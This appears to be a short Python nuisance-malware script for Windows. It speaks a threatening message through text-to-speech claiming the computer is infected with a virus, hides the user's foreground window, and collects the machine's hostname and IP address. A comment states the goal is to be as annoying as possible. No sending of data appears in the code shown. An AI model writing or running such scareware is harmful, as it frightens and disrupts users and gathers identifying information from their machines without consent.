import pyttsx3 as tts
import time
import ctypes
import win32gui
import win32con
import socket

engine =  tts.init()
engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
engine.runAndWait()
hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
pcname = socket.gethostname()
ip = socket.gethostbyname(pcname)
